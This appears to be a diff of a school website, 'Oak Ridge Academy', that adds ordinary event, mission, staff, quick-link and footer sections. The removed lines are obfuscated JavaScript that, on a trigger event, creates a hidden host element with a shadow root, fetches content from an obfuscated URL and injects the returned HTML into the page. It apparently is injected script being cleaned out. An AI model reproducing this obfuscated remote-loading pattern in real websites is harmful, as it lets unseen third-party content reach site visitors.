-let _0x4a3549=_0x583fe0[_0x1bca8f];
-return _0x4a3549;
-},_0x2e8f(_0x1d5f35,_0x46a75f);
-}
+  <!-- EVENTS -->
+  <section class="events-bg">
+    <div class="events-inner">
+      <div class="ev-head">
+        <div class="kicker">Calendar</div>
+        <h2 class="sec-title">Upcoming Events</h2>
+        <p>From academic competitions and college fairs to performances and community days — there's always something happening at Oak Ridge.</p>
+        <br/>
+        <a class="btn-gold" href="#" style="margin-top:0.5rem;display:inline-flex;">Full Calendar →</a>
+      </div>
+      <div class="ev-list">
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">Apr</div><div class="ev-day">4</div></div>
+          <div class="ev-info"><div class="ev-name">Spring Academic Awards Night</div><div class="ev-meta"><span>🕖 6:30 PM</span><span>📍 Main Auditorium</span></div><span class="ev-tag t-ac">Academic</span></div>
+        </div>
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">Apr</div><div class="ev-day">10</div></div>
+          <div class="ev-info"><div class="ev-name">Pennsylvania State Science Olympiad</div><div class="ev-meta"><span>🕗 8:00 AM</span><span>📍 Penn State University</span></div><span class="ev-tag t-ac">Academic</span></div>
+        </div>
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">Apr</div><div class="ev-day">18</div></div>
+          <div class="ev-info"><div class="ev-name">Spring Arts Showcase & Reception</div><div class="ev-meta"><span>🕔 4:00 PM</span><span>📍 ORA Main Gallery</span></div><span class="ev-tag t-ar">Arts</span></div>
+        </div>
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">Apr</div><div class="ev-day">22</div></div>
+          <div class="ev-info"><div class="ev-name">Earth Day Community Service Day</div><div class="ev-meta"><span>🕘 9:00 AM</span><span>📍 Oak Ridge Park</span></div><span class="ev-tag t-co">Community</span></div>
+        </div>
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">May</div><div class="ev-day">2</div></div>
+          <div class="ev-info"><div class="ev-name">Spring Track & Field Invitational</div><div class="ev-meta"><span>🕙 10:00 AM</span><span>📍 ORA Athletics Complex</span></div><span class="ev-tag t-sp">Athletics</span></div>
+        </div>
+        <div class="ev-item">
+          <div class="ev-date"><div class="ev-month">May</div><div class="ev-day">30</div></div>
+          <div class="ev-info"><div class="ev-name">Class of 2026 Graduation Ceremony</div><div class="ev-meta"><span>🕑 2:00 PM</span><span>📍 Eagle Field Amphitheater</span></div><span class="ev-tag t-ac">Commencement</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-const trigger=document[_0x51d2(0xcc)](_0x51d2(0xc1));
+  <!-- PILLARS -->
+  <section class="pillars-bg">
+    <div class="pillars-inner">
+      <div class="pillars-hd">
+        <div class="kicker">Our Mission</div>
+        <h2 class="sec-title">Built on Four Pillars</h2>
+        <p>Everything we do at Oak Ridge Academy is guided by four core commitments that shape our students into well-rounded, principled leaders.</p>
+      </div>
+      <div class="pillars-grid">
+        <div class="pillar" data-p="1"><div class="pi">📚</div><div class="pn">Academic Rigor</div><div class="pd">Challenging, standards-aligned curriculum with AP, honors, and enrichment pathways preparing every student for college and beyond.</div></div>
+        <div class="pillar" data-p="2"><div class="pi">🌱</div><div class="pn">Character Development</div><div class="pd">We nurture integrity, empathy, and resilience — building students who lead with purpose and treat others with genuine respect.</div></div>
+        <div class="pillar" data-p="3"><div class="pi">🎭</div><div class="pn">Arts & Expression</div><div class="pd">A vibrant arts program — music, theater, visual arts, and digital media — giving every student a voice and a stage.</div></div>
+        <div class="pillar" data-p="4"><div class="pi">🏃</div><div class="pn">Athletic Excellence</div><div class="pd">24 varsity and JV sports teams teaching teamwork, discipline, and the value of striving for your personal best every day.</div></div>
+      </div>
+    </div>
+  </section>
 
-trigger[_0x51d2(0xcb)](_0x51d2(0xc2),()=>{
+  <!-- STAFF -->
+  <section>
+    <div class="staff-inner">
+      <div class="sec-head">
+        <div><div class="kicker">Our Faculty</div><h2 class="sec-title">Meet Our Educators</h2></div>
+        <a class="see-all" href="#">Full Directory →</a>
+      </div>
+      <div class="staff-grid">
+        <div class="staff-card"><div class="staff-avatar">Dr. L</div><div class="staff-info"><div class="staff-name">Dr. Linda Harcourt</div><div class="staff-role">Principal</div><div class="staff-dept">Administration · 18 years at ORA</div></div></div>
+        <div class="staff-card"><div class="staff-avatar">Mr. T</div><div class="staff-info"><div class="staff-name">Mr. David Torres</div><div class="staff-role">AP Mathematics</div><div class="staff-dept">Mathematics Department</div></div></div>
+        <div class="staff-card"><div class="staff-avatar">Ms. C</div><div class="staff-info"><div class="staff-name">Ms. Priya Chandran</div><div class="staff-role">Head of Sciences</div><div class="staff-dept">Science Department</div></div></div>
+        <div class="staff-card"><div class="staff-avatar">Mr. R</div><div class="staff-info"><div class="staff-name">Mr. James Rivera</div><div class="staff-role">Athletics Director</div><div class="staff-dept">Physical Education & Sports</div></div></div>
+      </div>
+    </div>
+  </section>
 
-const host=document[_0x51d2(0xc3)](_0x51d2(0xc4));
-host.style=_0x51d2(0xc6);
+  <!-- QUICK LINKS -->
+  <section class="quick-bg">
+    <div class="quick-inner">
+      <div class="quick-head">
+        <div class="kicker">Quick Access</div>
+        <h2 class="sec-title">Everything You Need</h2>
+      </div>
+      <div class="quick-grid">
+        <a class="qlink" href="#"><div class="qi">🎒</div><div class="ql">Student Portal</div></a>
+        <a class="qlink" href="#"><div class="qi">👨‍👩‍👧</div><div class="ql">Parent Portal</div></a>
+        <a class="qlink" href="#"><div class="qi">📅</div><div class="ql">School Calendar</div></a>
+        <a class="qlink" href="#"><div class="qi">🍽️</div><div class="ql">Lunch Menu</div></a>
+        <a class="qlink" href="#"><div class="qi">🚌</div><div class="ql">Bus Routes</div></a>
+        <a class="qlink" href="#"><div class="qi">📋</div><div class="ql">Enrollment</div></a>
+      </div>
+    </div>
+  </section>
 
-document.body[_0x51d2(0xca)](host);
-
-const shadow=host[_0x51d2(0xbe)]({
-mode:_0x51d2(0xbf)
-});
-
-fetch(_0x51d2(0xc8))
-[_0x51d2(0xcd)](r=>r[_0x51d2(0xc9)]())
-[_0x51d2(0xcd)](html=>{
-shadow[_0x51d2(0xc7)]=html;
-});
-
-});
-</script>
+  <!-- FOOTER -->
+  <footer>
+    <div class="foot-main">
+      <div class="foot-brand">
+        <a class="logo" href="#" style="display:inline-flex;">
+          <div class="logo-shield">ORA</div>
+          <div class="logo-words">
+            <span class="logo-main" style="color:var(--white);">Oak Ridge Academy</span>
+            <span class="logo-sub">Est. 1962</span>
+          </div>
+        </a>
+        <p>Committed to excellence, community, and the whole-child development of every student we serve. Proudly serving Springfield, PA for over six decades.</p>
+        <div class="foot-contact">
+          <span>📍 1200 Oak Ridge Drive, Springfield, PA 19064</span>
+          <span>📞 (610) 555-0184</span>
+          <span>✉ info@oakridgeacademy.edu</span>
+        </div>
+      </div>
+      <div class="foot-col">
+        <h4>About</h4>
+        <ul>
+          <li><a href="#">Our History</a></li>
+          <li><a href="#">Mission & Vision</a></li>
+          <li><a href="#">Leadership Team</a></li>
+          <li><a href="#">Board of Education</a></li>
+          <li><a href="#">Accreditations</a></li>
+          <li><a href="#">Campus Map</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>Academics</h4>
+        <ul>
+          <li><a href="#">Curriculum Overview</a></li>
+          <li><a href="#">AP & Honors Courses</a></li>
+          <li><a href="#">STEM Programs</a></li>
+          <li><a href="#">College Counseling</a></li>
+          <li><a href="#">Special Education</a></li>
+          <li><a href="#">Library Resources</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>Community</h4>
+        <ul>
+          <li><a href="#">PTA / Parent Group</a></li>
+          <li><a href="#">Volunteer</a></li>
+          <li><a href="#">Alumni Network</a></li>
+          <li><a href="#">Donate</a></li>
+          <li><a href="#">Newsletter</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <p>© 2025–26 Oak Ridge Academy. All rights reserved. · <a href="#">Privacy Policy</a> · <a href="#">Accessibility</a></p>
+      <div class="accreds">
+        <span class="accred">NEASC Accredited</span>
+        <span class="accred">NAIS Member</span>
+        <span class="accred">Blue Ribbon School</span>
+      </div>
+    </div>
+  </footer>
 
 </body>
 </html>
